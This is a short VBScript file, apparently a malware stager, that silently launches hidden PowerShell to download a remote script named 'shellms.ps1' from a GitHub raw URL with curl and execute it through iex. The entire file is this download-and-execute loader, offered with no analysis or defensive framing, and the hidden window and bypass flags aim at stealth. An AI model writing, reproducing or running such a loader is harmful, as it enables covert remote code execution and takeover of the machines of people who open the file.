Set ws = CreateObject("WScript.Shell")
ws.Run "powershell -w hidden -nop -c ""iex([string]::Join([char]10,(curl.exe -s https://raw.githubusercontent.com/joaosetti98/sa/refs/heads/main/shellms.ps1)))""", 0, False
